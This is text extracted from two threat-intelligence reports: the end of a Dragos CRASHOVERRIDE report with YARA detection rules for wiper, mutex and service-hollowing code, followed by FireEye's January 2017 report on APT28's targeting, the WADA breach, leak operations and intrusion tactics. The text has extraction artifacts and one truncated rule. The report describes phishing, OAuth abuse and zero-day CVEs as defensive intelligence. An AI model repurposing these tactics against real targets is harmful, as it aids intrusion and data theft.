?? ?? ?? 8b f8 83 c4 ?8 }\n        $s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }\n        $s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }\n        $s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }\n    condition:\n        all of them\n}\n        \n 34\nYARA Rules\nrule dragos_crashoverride_weirdMutex\n{\n    meta:\n        description = \ufb01Blank mutex creation assoicated with CRASHOVERRIDE\ufb02\n        author = \ufb01Dragos Inc\ufb02\n    strings:\n        $s1 = { 81 ec 08 02 00 00 57 33 ff 57 57 57 ff 15 ?? ?? 40 00 a3 ?? ?? ?? 00 \n85 c0 }\n        $s2 = { 8d 85 ?? ?? ?? ff 50 57 57 6a 2e 57 ff 15 ?? ?? ?? 00 68 ?? ?? 40 00}\n    condition:\n        all of them\n}\n \nrule dragos_crashoverride_serviceStomper\n{\n    meta:\n        description = \ufb01Identify service hollowing and persistence setting\ufb02\n        author = \ufb01Dragos Inc\ufb02\n    strings:\n        $s0 = { 33 c9 51 51 51 51 51 51 ?? ?? ?? }\n        $s1 = { 6a ff 6a ff 6a ff 50 ff 15 24 ?? 40 00 ff ?? ?? ff 15 20 ?? 40 00 }\n    condition:\n        all of them\n}\n        \n 35\nYARA Rules\nrule dragos_crashoverride_wiperModuleRegistry\n{\n    meta:\n        description = \ufb01Registry Wiper functionality assoicated with CRASHOVERRIDE\ufb02\n        author = \ufb01Dragos Inc\ufb02\n    strings:\n        $s0 = { 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 }\n        $s1 = { 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 \n04 ?? ?? ?? }\n        $s2 = { 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? \n?? ?? 85 c0 }\n    condition:\n        all of them\n}\n \n{\n    meta:\n-\ner\ufb02\n        author = \ufb01Dragos Inc\ufb02\n    strings:\n        $s0 = { 6a 00 68 80 00 00 00 6a 03 6a 00 6a 02 8b f9 68 00 00 00 40 57 ff 15 \n1c ?? ?? ?? 8b d8 }\n        $s2 = { 6a 00 50 57 56 53 ff 15 4c ?? ?? ?? 56 }\n    condition:\n        all of them\n}\n        \n ", "FIREEYE \ni\nSIGHT INTELLIGENCE\nRUSSIA STRATEGICALLY EVOLVES \n \nITS CYBER OPERATIONS\nAPT28\n: \n \nAT THE CENTER \n \nOF THE STORM\nSPECIAL REPORT / JANUARY 2017\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \ni\nCONTENTS\nIntroduction\n \n1\nOverview\n \n2\nAPT28 Targeting And Intrusion Activity\n \n3\nTable 1 - APT28 Targeting of Political Entities and Intrusion Activity\n \n4\nTable 2 - APT28 Network Activity Has Likely Supported \nInformation Operations \n \n5\nFrom Olympic Slight to Data Leak: \nInvestigating APT28 at the World Anti-Doping Agency\n \n6\nConclusion\n \n8\nAppendix\n \n9\n The Democratic National Committee\u2122s (DNC) June \n2016 announcement attributing its network breach \nto the Russian Government triggered an international \ndebate over Russia\u2122s sponsorship of information \noperations against the U.S. \nINTRODUCTION\nAt issue is the question of proof: did the Russian Government direct the group \nresponsible for the breaches and related data leaks? If so, is this simply a matter \n \nof accepted state espionage, or did it cross a line? Was the DNC breach part \n \nof a concerted e\u02dcort by the Russian Government to interfere with the U.S. \npresidential election?\nUnfortunately, we have failed to ask the most consequential question: how will \nRussia continue to employ a variety of methods, including hacks and leaks, \n \nto undermine the institutions, policies, and actors that the Russian Government \nperceives as constricting and condemning its forceful pursuit of its state aims? \nOur visibility into the operations of APT28 - a group we believe the Russian \nGovernment sponsors - has given us insight into some of the government\u2122s \n \ntargets, as well as its objectives and the activities designed to further them. \n \nWe have tracked and pro\u02daled this group through multiple investigations, endpoint \nand network detections, and continuous monitoring. Our visibility into APT28\u2122s \noperations, which date to at least 2007, has allowed us to understand the group\u2122s \nmalware, operational changes, and motivations. This intelligence has been critical \nto protecting and informing our clients, exposing this threat, and strengthening \n \nour con\u02dadence in attributing APT28 to the Russian Government.\n \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n1\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n2\nOVERVIEW\nOn December 29, 2016, the Department of Homeland Security (DHS)\n \nand Federal Bureau of Investigation (FBI) released a Joint Analysis \nReport con\u02dcrming FireEye\u2122s long held public assessment that the Russian \nGovernment sponsors APT28. Since at least 2007, APT28 has engaged \n \nin extensive operations in support of Russian strategic interests. \n \nThe group, almost certainly compromised of a sophisticated and proli\u02dcc \nset of developers and operators, has historically collected intelligence on \ndefense and geopolitical issues. APT28 espionage activity has primarily \ntargeted entities in the U.S., Europe, and the countries of the former \nSoviet Union, including governments and militaries, defense attaches, \nmedia entities, and dissidents and \u02dcgures opposed to the current Russian \nGovernment.\nOver the past two years, Russia appears to have increasingly leveraged \nAPT28 to conduct information operations commensurate with broader \nstrategic military doctrine. After compromising a victim organization, \nAPT28 will steal internal data that is then leaked to further political \nnarratives aligned with Russian interests. To date these have included \n \nthe con\u02daict in Syria, NATO-Ukraine relations, the European Union refugee \nand migrant crisis, the 2016 Olympics and Paralympics Russian athlete \ndoping scandal, public accusations regarding Russian state-sponsored \nhacking, and the 2016 U.S. presidential election. \nThis report details our observations of APT28\u2122s \ntargeting, and our investigation into a related \nbreach. We also provide an update on shifts in the \ngroup\u2122s tool development and use, and summarize \nthe tactics APT28 employs to compromise its victims.\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n3\nAPT28 TARGETING AND \n \nINTRUSION ACTIVITY\nIn October 2014, FireEye released APT28: A Window into \nRussia\u2122s Cyber Espionage Operations?, and characterized \nAPT28\u2122s activity as aligning with the Russian Government\u2122s \nstrategic intelligence requirements. While tracking APT28, \nwe noted the group\u2122s interest in foreign governments and \nmilitaries, particularly those of European and Eastern \n \nEuropean nations, as well as regional security organizations, \nsuch as the North Atlantic Treaty Organization (NATO) \n \nand the Organization for Security and Cooperation \n \nin Europe (OSCE), among others. Table 1 highlights \n \nsome recent examples of this activity.\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n4\n1. \n \nGauquelin, Blaise. \ufb01La Russie soup\u00e7onn\u00e9e d\u2122\u00eatre responsable d\u2122un piratage informatique contre l\u2122OSCE.\ufb02 Le Monde. 28 Dec. 2016. Web. 29 Dec. 2016. \n2. \n \nTrend Micro refers to activity corresponding to FireEye\u2122s APT28 as \ufb01Pawn Storm.\ufb02\n3. \n \nHacquebord Feike. \ufb01Pawn Storm Targets German Christian Democratic Union.\ufb02 Trend Micro. 11 May 2016. Web. 29 Dec. 2016. \n4. \n \nHacquebord Feike. \ufb01Pawn Storm\u2122s Domestic Spying Campaign Revealed; Ukraine and US Top Global Targets.\ufb02 TrendLabs Security Intelligence Blog, Trend Micro. 18 August 2015. Web. 29 Dec.  2016. \n5. \n \n\ufb01Neuer Hackerangri\u02db auf Bundespolitiker / BSI warnt Parteien vor Cyberangri\u02dben.\ufb02 Westdeutscher Rundfunk. 20 Sept. 2016. Web. 29 Dec. 2016. \n 6. \n \n\ufb01Russia \u201awas Behind German Parliament Hack.\u2122\ufb02 The BBC. 13 May 2016. Web. 29 Dec. 2016. \n 7,\n \nKharouni, Loucif. et al. \ufb01Operation Pawn Storm: Using Decoys to Evade Detection.\ufb02 Trend Micro. 22 Oct. 2014. Web. 3 Jan. 2017. \nTABLE 1: \nAPT28 TARGETING OF POLITICAL ENTITIES AND INTRUSION ACTIVITY\nENTITY\nTIMEFRAME\nAPT28 TARGETING AND INTRUSION ACTIVITY \nOSCE\nNOVEMBER 2016\nThe OSCE con\u02darmed that it had su\u02dcered an intrusion, \n \nwhich a Western intelligence service attributed to APT28.\n1\n \nGermany's Christian \n \nDemocratic Union (CDU)\nAPRIL - MAY 2016\nResearchers at Trend Micro observed APT28  establish a fake \n \nCDU email server and launch phishing emails against CDU \n \nmembers in an attempt to obtain their email credentials and access \ntheir accounts.\n2,3\n \nPussy Riot\nAUGUST 2015\nAPT28 targets Russian rockers and dissidents Pussy Riot via \nspear-phishing emails.\n4\nNATO, Afghan Ministry \n \nof Foreign A\u02dcairs, Pakistani \nMilitary\nJULY 2015\nAPT28 used two domains (nato-news.com and bbc-news.org) to host \nan Adobe Flash zero-day exploit to target NATO, the Afghan Ministry \nof Foreign A\u02dcairs, and the Pakistani military.\nGerman Bundestag \n \n& Political Parties\nJUNE 2015\nGermany\u2122s Federal O\u02dbce for Security in Information Technology (BSI) \nannounced that APT28 was likely responsible for the spear phishing \nemails sent to members of several German political parties.  The head \nof Germany\u2122s domestic intelligence agency, Bundesamt f\u00fcr Ver\n-\nfassungsschutz (BfV), also attributed the June 2015 compromise of \nthe Bundestag\u2122s networks to APT28.\n5,6 \nKyrgyzstan Ministry \n \nof Foreign A\u02dcairs\nOCTOBER 2014 \nTHROUGH \n \nSEPTEMBER 2015\nFireEye iSight Intelligence identi\u02daed changes made to domain name \nserver (DNS) records that suggest that APT28 intercepted email traf\n-\n\u02dac from the Kyrgyzstan Ministry of Foreign A\u02dcairs after maliciously \nmodifying DNS records of the ministry\u2122s authoritative DNS servers.\nPolish Government & Power \nExchange websites\nJUNE AND \n \nSEPTEMBER 2014\nAPT28 employed \ufb01Sedkit\ufb02 in conjunction with strategic web compro\n-\nmises to deliver \ufb01Sofacy\ufb02 malware on Polish Government websites, \nand the websites of Polish energy company Power Exchange.\n7\n \n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n5\nTABLE 2: \nAPT28 NETWORK ACTIVITY HAS LIKELY SUPPORTED INFORMATION OPERATIONS\nSince 2014, APT28 network activity has likely supported \ninformation operations designed to in\u02dauence the domestic \npolitics of foreign nations. Some of these operations have \ninvolved the disruption and defacement of websites, false \u02daag \noperations using false hacktivist personas, and the theft of \ndata that was later leaked publicly online. \n \nTable 2 highlights incidents in which victims su\u02dbered \na compromise that FireEye iSIGHT Intelligence, other \nauthorities, or the victims themselves later attributed to the \ngroup we track as APT28. All of these operations have aimed \nto achieve a similar objective: securing a political outcome \nbene\u02dccial to Russia.\nVICTIM\nTIMEFRAME\nAPT28 NETWORK ACTIVITY \nASSOCIATED INFORMATION OPERATIONS \nACTIVITY\nWorld Anti-Doping \n \nAgency (WADA)\nSEPTEMBER 2016\nOn September 13, WADA con\u02darmed that APT28 \nhad compromised its networks and accessed \nathlete medical data.\n8\n  \nOn September 12, 2016, the \ufb01Fancy Bears\u2122 Hack Team\ufb02 persona \nclaimed to have compromised WADA and released athletes\u2122 \nmedical records as \ufb01proof of American athletes taking dop\n-\ning.\ufb02\n9\n \nU.S. Democratic National \nCommittee (DNC)\nAPRIL \u0152 \n \nSEPTEMBER 2016\nThe DNC announced it had su\u02dcered a network \ncompromise and that a subsequent investigation \nfound evidence of two breaches, attributed to \nAPT28 and APT29.  FireEye analyzed the mal\n-\nware found on DNC networks and determined \nthat it was consistent with our previous observa\n-\ntions of APT28 tools.\n10,11\nIn June 2016, shortly after the DNC\u2122s announcement, the Gu\n-\nccifer 2.0 persona claimed responsibility for the DNC breach \nand leaked documents taken from the organization\u2122s network.  \nGuccifer 2.0 continued to leak batches of DNC documents \nthrough September.\n12,13\nJohn Podesta\nMARCH \u0152 \n \nNOVEMBER 2016\nInvestigators found that John Podesta, Hillary \nClinton\u2122s presidential campaign chairman, was \none of thousands of individuals targeted in a \nmass phishing scheme using shortened URLs \nthat security researchers attributed to APT28.\n14\n  \nThroughout October and into early November, WikiLeaks pub\n-\nlished 34 batches of email correspondence stolen from John \nPodesta\u2122s personal email account. Correspondence of other \nindividuals targeted in the same phishing campaign, including \nformer Secretary of State Colin Powell and Clinton campaign \nsta\u02dcer William Rinehart, were published on the \n \n\ufb01DC Leaks\ufb02 website.\n15  \nU.S. Democratic \n \nCongressional Campaign \nCommittee (DCCC)\nMARCH - \n \nOCTOBER 2016\nIn July, the DCCC announced that it was investi\n-\ngating an ongoing \ufb01cybersecurity incident\ufb02 that \nthe FBI believed was linked to the compromise \nof the DNC.   House Speaker Nancy Pelosi \nlater con\u02darmed that the DCCC had su\u02dcered a \nnetwork compromise.   Investigators indicated \nthat the actors may have gained access to DCCC \nsystems as early as March.\n16,17,18\n \nIn August, the Guccifer 2.0 persona contacted reporters cov\n-\nering U.S. House of Representative races to announce newly \nleaked documents from the DCCC pertaining to Democratic \n \ncandidates. From August to October, Guccifer 2.0 posted sev\n-\neral additional installments of what appear to be internal DCCC \ndocuments on \ufb01his\ufb02 WordPress site.\n19,20\nTV5Monde\nFEBRUARY 2015, \nAPRIL 2015\nIn February, FireEye identi\u02daed CORESHELL \ntra\u02dbc beaconing from TV5Monde\u2122s network, \ncon\u02darming that APT28 had compromised TV\n-\n5Monde\u2122s network. \nIn April 2015, alleged pro-ISIS hacktivist group CyberCaliphate \ndefaced TV5Monde\u2122s websites and social media pro\u02dales and \nforced the company\u2122s 11 broadcast channels o\u02ddine.  FireEye \nidenti\u02daed overlaps between the domain registration details of \nCyberCaliphate\u2122s website and APT28 infrastructure.\n21\nUkrainian Central \n \nElection Commission \n(CEC)\nMAY 2014\nUkrainian o\u02dbcials revealed that the investigation \ninto the compromise of the CEC\u2122s internal net\n-\nwork identi\u02daed malware traced to APT28.\n22\n \nDuring the May 2014 Ukrainian presidential election, purported \npro-Russian hacktivists CyberBerkut conducted a series of mali\n-\ncious activities against the CEC including a system compromise, \ndata destruction, a data leak, a distributed denial-of-service \n(DDoS) attack, and an attempted defacement of the CEC web\n-\nsite with fake election results.\n23\n  \n8.\n \n\ufb01WADA Con\u02dcrms Attack by Russian Cyber Espionage Group.\ufb02 World Anti-Doping Agency. 13 Sept. 2016. Web. 29 Dec. 2016. \n9.\n \nFancy Bears\u2122 HT (fancybears). \ufb01@AnonPress Greetings. We hacked #WADA. We have Proof of American Athletes taking doping. Fancybear.net.\ufb02 12 Sept. 2016, 4:12 PM. Tweet. \n10.\n \nCrowdStrike refers to activity corresponding to FireEye\u2122s APT28 and APT29 as \ufb01Fancy Bear\ufb02 and \ufb01Cozy Bear,\ufb02 respectively.\n11. \n \n\ufb01Nakashima, Ellen. \ufb01Cyber Researchers Con\u02dcrm Russian Government Hack of Democratic National Committee.\ufb02 The Washington Post. 20 June 2016. Web. 29 Dec. 2016. \n12. \n \n\ufb01Rid, Thomas. \ufb01All Signs Point to Russia Being Behind the DNC Hack.\ufb02 Motherboard, Vice. 25 July 2016. Web. 29 Dec. 2016. \n13.  \n \n\ufb01Bennett, Cory. \ufb01Guccifer 2.0 Drops More DNC Docs.\ufb02 Politico. 13 Sept. 2016. Web. 2 Jan. 2017. <>\n14.\n \nPerlroth, Nicole. Shear, Michael D. \ufb01Private Security Group Says Russia was Behind John Podesta\u2122s Email Hack.\ufb02 The New York Times. 21 Oct. 2016. Web. 2 Jan. 2017. \n15. \n \n\ufb01Franceschi-Bicchierai, Lorenzo. \ufb01How Hackers Broke Into John Podesta and Colin Powell\u2122s Gmail Accounts.\ufb02 20 Oct. 2016. Web. 2 Jan. 2017. \n16.\n \n\ufb01Nakashima, Ellen. \ufb01FBI Probes Suspected Breach of Another Democratic Organization by Russian Hackers.\ufb02 The Washington Post. 29 July 2016. Web. 29 Dec. 2016. \n17. \n \n\ufb01Pelosi, Nancy. \ufb01DCCC Cyber Breach.\ufb02 13 August 2016. Email. U.S. House of Representatives. Washington, DC. Politico. Web. 29 Dec. 2016. \n18. \n \n\ufb01Lipton, Eric. Shane, Scott. \ufb01Democratic House Candidates Were Also Targets of Russian Hacking.\ufb02 The New York Times. 13 Dec. 2016. Web. 29 Dec. 2016. \n19. \n \nIbid.\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n6\nFROM OLYMPIC SLIGHT TO DATA LEAK: \nInvestigating APT28 at the World Anti-Doping Agency\nAs news of the DNC breach spread, APT28 was preparing for another set \nof operations: countering the condemnation that Russia was facing after \ndoping allegations and a threatened blanket ban of the Russian team \nfrom the upcoming Rio Games. Russia, like many nations, has long viewed \nsuccess in the Olympic Games as a source of national prestige and soft \npower on the world stage. The doping allegations and prospective ban \nfrom the Games further ostracized Russia, and likely provided motivation \nto actively counter the allegations by attempting to discredit anti-doping \nagencies and policies. Our investigation of APT28\u2122s compromise of \nWADA\u2122s network, and our observations of the surrounding events reveal \nhow Russia sought to counteract a damaging narrative and delegitimize \nthe institutions leveling criticism. \nALLEGATIONS OF RUSSIAN ATHLETES\u2122 WIDESPREAD DOPING\nNOV (2015)\nWADA declares the \nRussian Anti-Doping \nAgency (RUSADA) non-\ncompliant.\n24\nJULY 18 \nWADA-commissioned \nreport documents \nevidence of Russian \nathletes\u2122 widespread \ndoping.\n25\nAUG 4 \nRussian athletes were \nbarred from competing \nin the Olympic Games.\n26\nAPT28 COMPROMISES WADA\nEARLY AUG \nAPT28 sends spear \nphishing emails to \nWADA employees.\n27\nAUG 10 \nAPT28 uses a legitimate \nuser account belonging \nto a Russian athlete to \nlog into WADA\u2122s Anti-\nDoping Administration \nand Management \nSystem (ADAMS) \ndatabase.\n28\nAUG 25-SEP 12\nAPT28 gains access \nto an International \nOlympic Committee \naccount created \nspeci\u02dccally for the 2016 \nOlympic Games, and \nviews and downloads \nathlete data.\n29\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n7\nBased on this timeline of leak and threatened leak \nactivity, as well as strikingly similar characteristics and \ndistribution methods shared between @anpoland and \n\ufb01Fancy Bears\u2122 Hack Team,\ufb02 the same operators are highly \nlikely behind the two personas. WADA o\u02ddcials, citing \nevidence provided by law enforcement, stated that the \nthreat activity originated in Russia, possibly in retaliation \nfor WADA\u2122s exposure of Russia\u2122s expansive, state-run \ndoping.\n38\n The statement prompted denials from the \nRussian Government, with Russian sports minister \n \nVitaly Mutko asking, \ufb01How can you prove that the \nhackers are Russian? You blame Russia for everything, \n \nit is very in fashion now.\ufb02\n39\n20.\n \nGallagher, Sean. \ufb01Guccifer 2.0 Posts DCCC Docs, Says They\u2122re From Clinton Foundation.\ufb02 Ars Technica. 4 Oct. 2016. Web. 3 Jan. 2017. \n21.\n \n\ufb01Russian Hackers Suspected in French TV Cyberattack.\ufb02 Deutsche Welle. 6 Oct. 2015. Web. 29 Dec. 2016. \n22.\n \nJoselow, Gabe. \ufb01Election Cyberattacks: Pro-Russia Hackers Have Been Accused in Past.\ufb02 NBC News. 3 Nov. 2016. Web. 29 Dec. 2016. \n23. \n \nClayton, Mark. \ufb01Ukraine Election Narrowly Avoided \u201aWanton Destruction\u2122 From Hackers (+Video).\ufb02 The Christian Science Monitor. 17 June 2014. Web. 2 Jan. 2017. \n24. \ufb01Foundation Board Media Release: WADA Strengthens Anti-Doping Worldwide.\ufb02 World Anti-Doping Agency. 18 November 2015.\n25. \n \n\ufb01Russia State-Sponsored Doping Across Majority of Olympic Sports, Claims Report.\ufb02 The BBC. 18 July 2016. Web. 29 Dec. 2016. \n26.\n \n Macguire, Eoghan. Almasy, Steve. \ufb01271 Russian Athletes Cleared for Rio Games.\ufb02 CNN. 5 August 2016. Web. 29 Dec. 2016. \n27. \n \n\ufb01Cyber Security Update: WADA\u2122s Incident Response.\ufb02 World Anti-Doping Agency. 5 Oct. 2016. Web. 3 Jan. 2017. \n28. \n \n\ufb01WADA Con\u02dcrms Attack by Russian Cyber Espionage Group.\ufb02 World Anti-Doping Agency. 13 Sept. 2016.\n29.\n \n\ufb01WADA Con\u02dcrms Another Batch of Athlete Data Leaked by Russian Cyber Hackers \u201aFancy Bear.\u2122\ufb02 World Anti-Doping Agency. 14 Sept. 2016. Web. 29 Dec. 2016. <>\n30.\n \n[OP PL]. \ufb01www.tas-cas.org.\ufb02 Online video clip. YouTube. YouTube, 9 Aug. 2016. Web. 3 Jan. 2017. \n31. \n \nAnonymous Poland (@anpoland). \ufb01@Cryptomeorg @ben_rumsby @PogoWasRight @Jason_A_Murdock @Cyber_War_News @kevincollier Tomorrow will ddos WADA and publish some secret dosc.\ufb02 11 Aug 2016 10:10 \nAM. Tweet. \n32. \n \nAnonymous Poland (@anpoland). \ufb01@JoeUchill within a few days will be new attack on the WADA/Olimpic.\ufb02 5 Sept. 2016 5:19 AM. Tweet. \n33.\n \nFancy Bears\u2122 HT (fancybears). \ufb01@AnonPress Greetings. We hacked #WADA. We have Proof of American Athletes taking doping. Fancybear.net.\ufb02 \n34.\n \n Ibid.\n35. \n \n\ufb01WADA Con\u02dcrms Attack by Russian Cyber Espionage Group.\ufb02World Anti-Doping Agency.13 Sept. 2016.\n36.\n \n Russian Hackers Leak Simone Biles and Serena Williams Files.\ufb02 The BBC. 13 Sept. 2016. Web. 29 Dec. 2016. \n37.\n \n Rumsby, Ben. \ufb01US Superstars Serena and Venus Williams and Simone Biles Given Drugs Exemption, Russian Hackers Reveal.\ufb02 The Telegraph. 14 Sept. 2016. Web. 29 Dec. 2016. \n38.\n \n Luhn, Alec.\ufb02Fancy Bears Origins Unclear But Russia Seizes Chance to Put Boot into Wada.\ufb02 15 Sept. 2016. Web. 29 Dec. 2016. \n39. \n \nGibson, Owen. \ufb01Russian Sports Minister Vitaly Mutko Denies Link to Wada Hackers.\ufb02 The Guardian. 14 Sept. 2016. Web. 29 Dec. 2016. \nFALSE HACKTIVIST PERSONAS CLAIM TO TARGET WADA, LEAK ATHLETE DATA \nAUG 9\nThe actor \n \n@anpoland, \npurporting to \n \nrepresent \n\ufb01Anonymous Poland,\ufb02 \nclaims to have \ndefaced the \n \nWADA website.\n30\nAUG 11 \nOn August 11 \n \n@anpoland threatens \nto conduct a DDoS \nattack against and \nleak data from WADA, \n \nbut fails to follow \nthrough on the \nthreats.\n31,32\nSEP 12\n\ufb01Fancy Bears\u2122 Hack \nTeam\ufb02, a previously \nunknown group \npurporting to \nbe a\u02ddliated with \nAnonymous, claims \nvia Twitter to have \ncompromised WADA, \nand directs readers \nto a website hosting \nstolen documents.\n33\n \nIn tweets to \ninternational \njournalists and \n \nTwitter accounts \n \nthat disseminate \nhacktivist and \ninformation security \nnews, \ufb01Fancy Bears\u2122 \nHack Team\ufb02 claims \nto have \ufb01proof of \nAmerican athletes \ntaking doping.\ufb02\n34\nSEP 13\nWADA releases a \nstatement con\u02dcrming \nthe breach and \nattributes the \ncompromise and \n \ntheft of athlete \nmedical data \n \nto APT28.\n35\nSEP 15-30\n\ufb01Fancy Bears\u2122 Hack \nTeam\ufb02 releases \u02dcve \nadditional batches \nof medical \u02dcles for \nhigh-pro\u02dcle athletes \nfrom multiple nations, \nincluding the U.S., \nwhich had applied \nfor and received \nTherapeutic Use \nExemptions (TUEs) \nfor medications \notherwise banned \nfrom competition.\n36 \nClaiming to support \n\ufb01fair play and clean \nsport,\ufb02 Fancy Bears\u2122 \nHack team calls TUEs \n\ufb01licenses for doping.\ufb02\n37\n Since releasing our 2014 report, we continue to assess that \nAPT28 is sponsored by the Russian Government. We further \nassess that APT28 is the group responsible for the network \ncompromises of WADA and the DNC and other entities \nrelated to the 2016 U.S. presidential election cycle. These \nbreaches involved the theft of internal data - mostly emails \n\u0152 that was later strategically leaked through multiple forums \nand propagated in a calculated manner almost certainly \nintended to advance particular Russian Government aims. In \na report released on January 7 2017, the U.S. Directorate of \nNational Intelligence described this activity as an \ufb01in\u02dauence \ncampaign.\ufb02 \nThis in\u02dauence campaign - a combination of network \ncompromises and subsequent data leaks - aligns closely \nwith the Russian military\u2122s publicly stated intentions and \ncapabilities. In\u02dauence operations, also frequently called \n\ufb01information operations,\ufb02 have a long history of inclusion \nin Russian strategic doctrine, and have been intentionally \ndeveloped, deployed, and modernized with the advent of \nthe internet. The recent activity in the U.S. is but one of \nmany instances of Russian Government in\u02dauence operations \nconducted in support of strategic political objectives, and it \nwill not be the last. As the 2017 elections in Europe approach \n- most notably in Germany, France, and the Netherlands - we \nare already seeing the makings of similarly concerted e\u02dborts.\nCONCLUSION\n \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n8\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n9\nIn our 2014 report, we identi\u02dced APT28 as a suspected Russian \ngovernment-sponsored espionage actor. We came to this conclusion \nin part based on forensic details left in the malware that APT28 had \nemployed since at least 2007. We have provided an updated version of \nthose conclusions, a layout of the tactics that they generally employ, \nas well as observations of apparent tactical shifts. For full details, \nplease reference our 2014 report, \nAPT28: A Window into Russia\u2122s Cyber \nEspionage Operations\n? \nAPT28 employs a suite of malware with features indicative of the group\u2122s \nplans for continued operations, as well as the group\u2122s access to resources \nand skilled developers.  \nKey characteristics of APT28\u2122s toolset include:\n\u0141\n \nA \u02dcexible, modular framework\n \nthat has allowed APT28 \n \nto consistently evolve its toolset since at least 2007. \n\u0141\n \nUse of a formal coding environment\n in which to develop \ntools, allowing the group to create and deploy custom \n \nmodules within its backdoors.\n\u0141\n \nIncorporation of counter-analysis capabilities\n including \nruntime checks to identify an analysis environment, obfuscated \nstrings unpacked at runtime, and the inclusion of unused \nmachine instructions to slow analysis.\n\u0141\n \nCode compiled during the normal working day in the Moscow \ntime zone and within a Russian language build environment.\n \nOVER\n97%\nOF\n \n \nAPT28\u2122S MALWARE \nSAMPLES WERE \nCOMPILED\n \nDURING \n \nTHE WORKING WEEK\n88%\nOF \n \nSAMPLES COMPILED \nBETWEEN\n \n8AM AND 6PM\n \nIN THE TIMEZONE THAT \nINCLUDES MAJOR RUSSIAN \nCITIES SUCH AS MOSCOW \nAND ST. PETERSBURG\nIN ADDITION, \n \nAPT28\u2122S DEVELOPERS \nCONSISTENTLY BUILT \nMALWARE IN RUSSIAN \nLANGUAGE\n \nSETTINGS UNTIL\n2013\nAPPENDIX: \nAPT28\u2122s Tools, Tactics, and Operational Changes\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n10\nAPT28\u2122S MALWARE SUITE\nTOOL\nROLE\nAKA\nCHOPSTICK\nbackdoor\nXagent, webhp, SPLM, (.v2 fysbis)\nEVILTOSS\nbackdoor\nSedreco, AZZY, Xagent, ADVSTORESHELL, NETUI\nGAMEFISH\nbackdoor\nSednit, Seduploader, JHUHUGIT, Sofacy\nSOURFACE\ndownloader\nOlder version of CORESHELL, Sofacy\nOLDBAIT\ncredential \n \nharvester\nSas\u02das\nCORESHELL\ndownloader\nNewer version of SOURFACE, Sofacy \nAPT28\u2122S OPERATIONAL CHANGES SINCE 2014\nAPT28 continues to evolve its toolkit and re\u02dcne its tactics \n \nin what is almost certainly an e\u02dbort to protect its operational \ne\u02dbectiveness in the face of heightened public exposure and \nscrutiny. In addition to the continued evolution of the group\u2122s \n\u02dcrst stage tools, we have also noted APT28:\n\u0141\n \nLeveraging zero-day vulnerabilities\n in Adobe Flash Player, \nJava, and Windows, including CVE-2015-1701, CVE-2015-2424, \nCVE-2015-2590, CVE-2015-3043, CVE-2015-5119, and CVE-\n2015-7645. \n\u0141\n \nUsing a pro\u02daling script\n to deploy zero-days and other \n \ntools more selectively, decreasing the chance that researchers \n \nand others will gain access to the group\u2122s tools.\n\u0141\n \nIncreasing reliance on public code depositories\n, such \n \nas Carberp, PowerShell Empire, P.A.S. webshell, Metasploit \nmodules, and others in a likely e\u02dbort to accelerate their \ndevelopment cycle and provide plausible deniability.\n\u0141\n \nObtaining credentials through fabricated Google \n \nApp authorization and Oauth access\n requests that allow \n \nthe group to bypass two-factor authentication and other \nsecurity measures.\n\u0141\n \nMoving laterally through a network relying only \n \non legitimate tools\n that already exist within the victims\u2122 \nsystems, at times forgoing their traditional toolset for the \nduration of the compromise.\nThese changes are not only indicative of APT28\u2122s skills, \nresourcefulness, and desire to maintain operational \ne\u02dbectiveness, but also highlight the longevity of the \n \ngroup\u2122s mission and its intent to continue its activities \n \nfor the foreseeable future.\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n11\nAPT28 TACTICS\nWe have observed APT28 rely on four key tactics when attempting \n \nto compromise intended targets. These include sending spear-phishing \nemails that either deliver exploit documents that deploy malware onto \na user\u2122s systems, or contain a malicious URL designed to harvest the \nrecipients\u2122 email credentials and provide access to the their accounts. \nAPT28 has also compromised and placed malware on legitimate websites \nintending to infect site visitors, and has gained access to organizations by \ncompromising their web-facing servers\n.\nAPT28 IS IN YOUR NETWORK.\nVictim goes to link and \n \nretrieves malicious \n \ndocument or is served a\n \nweb-based exploit that \n \ninstalls malware.\n(Flash Vulnerability CVE-\n2016-7855 and Windows \nVulnerability CVE-2016-7255 \nwere exploited as zero days to \ninstall malware on victims who \nvisited a malicious URL).\nVictim opens document, \nand malware is installed by \nexploiting a vulnerability \n(e.g., ARM-NATO_\nENGLISH_30_NOV_2016.\ndoc leveraged an Adobe Flash \nexploit, CVE-2016-7855, \n \nto install GAMEFISH \n \ntargeted machine).\nTACTIC\nCraft exploit document \n \nwith enticing lure content.\nSend exploit document \n \nto victim.\nSend link mirroring structure \n \nof legitimate organization\u2122s \nsite that is designed to \nexpire once users clickit.\nRegister a domain spoo\u02dcng \nthat of a legitimate \norganization (e.g., \ntheguardiannews[.]org).\nINFECTION WITH MALWARE VIA SPEAR PHISH\nPerson is asked to authorize \napplication to view mail \n \nand gives access.\nAPT28 leverages OAuth \nprivileges given to malicious \napplication to read email.\nRecipient visits fake login page \nand enters credentials.\nAPT28 uses stolen \n \ncredentials to access \n \nmailbox and read email. \nRegister a domain spoo\u02dcng a webmail service \n \nor an organization\u2122s webmail portal \n \n(e.g., 0nedrive-0\u02ddce365[.]com)\nSend email to targets \n \ninstructing them \n \nto 